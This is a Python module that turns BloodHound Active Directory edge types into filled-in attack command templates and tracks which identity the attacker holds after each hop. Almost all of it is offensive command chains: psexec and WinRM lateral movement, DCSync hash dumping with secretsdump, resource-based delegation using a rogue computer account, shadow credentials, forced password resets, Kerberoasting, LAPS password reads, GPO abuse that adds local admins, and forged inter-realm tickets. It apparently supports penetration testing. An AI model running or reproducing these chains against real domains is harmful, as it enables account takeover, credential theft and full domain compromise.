"""Exploit command suggestions for each BloodHound edge type.

get_commands() returns (CommandSet, next_actor) where next_actor is the
identity the attacker operates as AFTER exploiting this edge.
"""

from __future__ import annotations
from dataclasses import dataclass, field


@dataclass
class CommandSet:
    description: str
    commands: list[str] = field(default_factory=list)

    @property
    def has_commands(self) -> bool:
        return bool(self.commands)


def _fqdn_to_dn(fqdn: str) -> str:
    return ",".join(f"DC={part}" for part in fqdn.split("."))


def _parse(label: str) -> dict:
    """Extract short name, domain, and FQDN from a display name."""
    label = (label or "").strip()
    if "@" in label:
        short, domain = label.rsplit("@", 1)
        return {"short": short, "domain": domain, "fqdn": label}
    if "." in label:
        parts = label.split(".")
        return {"short": parts[0].upper(), "domain": ".".join(parts[1:]), "fqdn": label}
    return {"short": label, "domain": "<DOMAIN>", "fqdn": label}


def _next_actor(
    rel_type: str,
    dst_name: str,
    dst_kind: str,
    current: str,
) -> str:
    """Return the identity the attacker operates as after this hop."""
    user_kinds = ("users", "")

    if rel_type in ("ForceChangePassword", "AddKeyCredentialLink"):
        return dst_name
    if rel_type in ("AllowedToDelegate", "AllowedToAct", "WriteAccountRestrictions"):
        act = _parse(current)
        return f"Administrator@{act['domain']}"
    if rel_type == "GenericWrite" and dst_kind in user_kinds:
        return dst_name
    if rel_type == "GenericAll" and dst_kind in user_kinds:
        return dst_name
    if rel_type == "AllExtendedRights" and dst_kind in user_kinds:
        return dst_name
    if rel_type in ("ReadLAPSPassword", "SyncLAPSPassword"):
        return f"local Administrator on {dst_name}"
    if rel_type == "HasSession":
        return dst_name  # steal the session owner's token
    return current  # no identity change


def get_commands(
    rel_type: str,
    src_id: str,
    dst_id: str,
    src_name: str = "",
    dst_name: str = "",
    src_kind: str = "",
    dst_kind: str = "",
    actor: str = "",
) -> tuple[CommandSet, str]:
    """Return (CommandSet, next_actor) for a given edge.

    actor: display name of the identity currently in use.
           Defaults to src_name if empty.
    """
    act = _parse(actor or src_name)
    dst = _parse(dst_name or dst_id)

    A  = act["short"]   # attacker short name
    D  = act["domain"]  # attacker domain
    T  = dst["short"]   # target short name
    TF = dst["fqdn"]    # target FQDN

    PASS = "<SRC_PASSWORD>"
    HASH = "<NTLM_HASH>"
    DC   = "<DC_IP>"

    na = _next_actor(rel_type, dst_name or dst_id, dst_kind, actor or src_name)

    match rel_type:

        case "MemberOf" | "Contains":
            return CommandSet("Structural relationship — no action required."), na

        case "AdminTo":
            return CommandSet(
                f"Local admin on {TF} — execute commands or dump credentials.",
                [
                    f"impacket-psexec '{D}/{A}:{PASS}@{TF}'",
                    f"impacket-wmiexec '{D}/{A}:{PASS}@{TF}'",
                    f"evil-winrm -i {TF} -u '{A}' -p '{PASS}'",
                    f"# Pass-the-hash:",
                    f"impacket-psexec '{D}/{A}@{TF}' -hashes ':{HASH}'",
                ],
            ), na

        case "CanRDP":
            return CommandSet(
                f"RDP access to {TF}.",
                [f"xfreerdp /v:{TF} /u:'{A}' /p:'{PASS}' /d:{D} /cert-ignore"],
            ), na

        case "CanPSRemote":
            return CommandSet(
                f"WinRM / PSRemote access to {TF}.",
                [
                    f"evil-winrm -i {TF} -u '{A}' -p '{PASS}'",
                    f"evil-winrm -i {TF} -u '{A}' -H '{HASH}'",
                ],
            ), na

        case "ExecuteDCOM":
            return CommandSet(
                f"DCOM lateral movement to {TF}.",
                [f"impacket-dcomexec -object MMC20 '{D}/{A}:{PASS}@{TF}' 'cmd.exe /c whoami'"],
            ), na

        case "SQLAdmin":
            return CommandSet(
                f"SQL Server admin on {TF}.",
                [
                    f"impacket-mssqlclient '{D}/{A}:{PASS}@{TF}' -windows-auth",
                    f"# In mssqlclient: EXEC xp_cmdshell 'whoami'",
                ],
            ), na

        case "HasSession":
            return CommandSet(
                f"{TF} has an active session from a privileged user. Connect and steal the token.",
                [
                    f"impacket-psexec '{D}/{A}:{PASS}@{TF}'",
                    f"# Once on host — dump sessions:",
                    f"# mimikatz: sekurlsa::logonpasswords",
                    f"# Rubeus:   Rubeus.exe dump /nowrap",
                ],
            ), na

        case "DCSync":
            return CommandSet(
                f"DCSync — dump all domain hashes.",
                [
                    f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                    f"# Pass-the-hash:",
                    f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{A}@{DC}'",
                    f"# On-host (Mimikatz):",
                    f"# lsadump::dcsync /domain:{D} /all /csv",
                ],
            ), na

        case "GetChangesAll":
            return CommandSet(
                "GetChangesAll + GetChanges = DCSync rights.",
                [f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'"],
            ), na

        case "GenericAll":
            if dst_kind in ("users", ""):
                return CommandSet(
                    f"Full control over user {TF} — reset password, shadow creds.",
                    [
                        f"# Option 1 — force password reset:",
                        f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                        f"# Option 2 — shadow credentials:",
                        f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                    ],
                ), na
            elif dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Full control over domain {TF} — grant DCSync rights.",
                    [
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'",
                    ],
                ), na
            elif dst_kind == "computers":
                return CommandSet(
                    f"Full control over computer {TF} — RBCD or shadow credentials.",
                    [
                        f"# Option 1 — Resource-Based Constrained Delegation:",
                        f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
                        f"rbcd.py -f 'PWNED$' -t '{T}' -dc-ip {DC} '{D}/{A}:{PASS}'",
                        f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
                        f"export KRB5CCNAME=Administrator@cifs_{T}.ccache",
                        f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                        f"# Option 2 — shadow credentials:",
                        f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                    ],
                ), na
            else:
                return CommandSet(
                    f"Full control over group {TF} — add member.",
                    [
                        f"net rpc group addmem '{T}' '{A}' -U '{D}/{A}%{PASS}' -S {DC}",
                        f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'",
                    ],
                ), na

        case "AllExtendedRights":
            if dst_kind == "domains":
                return CommandSet(
                    f"All extended rights on domain {TF} — includes DCSync.",
                    [f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{DC}'"],
                ), na
            return CommandSet(
                f"All extended rights on {TF} — includes ForceChangePassword.",
                [
                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                ],
            ), na

        case "AddMember" | "AddSelf":
            return CommandSet(
                f"Add a controlled user to group {TF}.",
                [
                    f"net rpc group addmem '{T}' '{A}' -U '{D}/{A}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' add groupMember '{T}' '{A}'",
                    f"# PowerView:",
                    f"Add-DomainGroupMember -Identity '{T}' -Members '{A}' -Credential $Cred",
                ],
            ), na

        case "ForceChangePassword":
            return CommandSet(
                f"Force-reset the password of {TF} — no current password needed.",
                [
                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{A}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                    f"# PowerView:",
                    f"Set-DomainUserPassword -Identity '{T}' -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force) -Credential $Cred",
                ],
            ), na

        case "GenericWrite":
            return CommandSet(
                f"Generic write on {TF} — shadow credentials or WriteSPN + Kerberoast.",
                [
                    f"# Option 1 — shadow credentials:",
                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                    f"# Option 2 — write fake SPN then Kerberoast:",
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' servicePrincipalName -v 'fake/blah'",
                    f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request",
                    f"hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                ],
            ), na

        case "WriteSPN":
            return CommandSet(
                f"Write SPN on {TF} then Kerberoast.",
                [
                    f"bloodyAD --host {DC} -d {D} -u '{A}' -p '{PASS}' set object '{T}' servicePrincipalName -v 'fake/blah'",
                    f"impacket-GetUserSPNs '{D}/{A}:{PASS}' -dc-ip {DC} -request",
                    f"hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                ],
            ), na

        case "Owns" | "WriteOwner":
            if dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Take ownership of {TF}, then grant DCSync rights.",
                    [
                        f"owneredit.py -action write -new-owner '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    ],
                ), na
            return CommandSet(
                f"Take ownership of {TF}, then grant yourself FullControl.",
                [
                    f"owneredit.py -action write -new-owner '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    f"dacledit.py -action write -rights FullControl -principal '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                ],
            ), na

        case "WriteDacl":
            if dst_kind == "domains":
                dn = _fqdn_to_dn(TF)
                return CommandSet(
                    f"Modify DACL on {TF} — grant DCSync rights.",
                    [
                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                        f"# PowerView:",
                        f"Add-DomainObjectAcl -TargetIdentity '{T}' -PrincipalIdentity '{A}' -Rights DCSync -Credential $Cred",
                    ],
                ), na
            return CommandSet(
                f"Modify DACL on {TF} — grant yourself FullControl.",
                [
                    f"dacledit.py -action write -rights FullControl -principal '{A}' -target '{T}' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    f"# PowerView:",
                    f"Add-DomainObjectAcl -TargetIdentity '{T}' -PrincipalIdentity '{A}' -Rights All -Credential $Cred",
                ],
            ), na

        case "ReadLAPSPassword" | "SyncLAPSPassword":
            return CommandSet(
                f"Read the LAPS local admin password for {TF}.",
                [
                    f"impacket-GetLAPSPassword '{D}/{A}:{PASS}@{DC}' -computer-name '{T}'",
                    f"pyLAPS --action get -c '{T}' -d {D} -u '{A}' -p '{PASS}' --dc-ip {DC}",
                    f"# PowerShell:",
                    f"Get-ADComputer -Identity '{T}' -Properties 'ms-Mcs-AdmPwd' | Select -Expand 'ms-Mcs-AdmPwd'",
                ],
            ), na

        case "AllowedToDelegate":
            return CommandSet(
                f"Constrained delegation — impersonate Administrator on {TF}.",
                [
                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/{A}:{PASS}' -dc-ip {DC}",
                    f"export KRB5CCNAME=Administrator@cifs_{T}.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            ), na

        case "AllowedToAct" | "WriteAccountRestrictions":
            return CommandSet(
                f"Resource-Based Constrained Delegation (RBCD) on {TF}.",
                [
                    f"# 1. Create a controlled computer account:",
                    f"impacket-addcomputer '{D}/{A}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
                    f"# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on {TF}:",
                    f"rbcd.py -f 'PWNED$' -t '{T}' -dc-ip {DC} '{D}/{A}:{PASS}'",
                    f"# 3. Get a service ticket as Administrator:",
                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
                    f"export KRB5CCNAME=Administrator@cifs_{T}.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            ), na

        case "AddKeyCredentialLink":
            return CommandSet(
                f"Shadow credentials on {TF} — add key credential, obtain TGT.",
                [
                    f"pywhisker -d {D} -u '{A}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                    f"# pywhisker outputs the gettgtpkinit command, e.g.:",
                    f"gettgtpkinit.py -cert-pfx '{T}.pfx' -pfx-pass '<PFX_PASS>' '{D}/{T}' '{T}.ccache'",
                    f"export KRB5CCNAME='{T}.ccache'",
                    f"impacket-secretsdump -k -no-pass '{D}/{T}@{DC}'",
                ],
            ), na

        case "GPLink":
            return CommandSet(
                f"GPO linked to {TF} — push malicious scheduled task.",
                [
                    f"pygpoabuse '{D}/{A}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command 'net localgroup administrators {A} /add' -taskname 'update'",
                    f"# Or SharpGPOAbuse:",
                    f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {A} --GPOName '<GPO_NAME>'",
                ],
            ), na

        case "TrustedBy":
            return CommandSet(
                f"Domain trust — {TF} trusts the current domain. Forge inter-realm TGT.",
                [
                    f"impacket-ticketer -nthash '{HASH}' -domain-sid '<SRC_DOMAIN_SID>' -domain {D} -extra-sid '<DST_DOMAIN_SID>-519' Administrator",
                    f"export KRB5CCNAME=Administrator.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            ), na

        case _:
            return CommandSet(
                f"Edge type '{rel_type}' — consult BloodHound documentation for exploitation steps."
            ), na
